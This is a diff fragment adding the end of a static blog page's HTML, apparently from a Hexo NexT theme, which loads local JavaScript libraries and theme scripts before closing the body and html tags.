+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
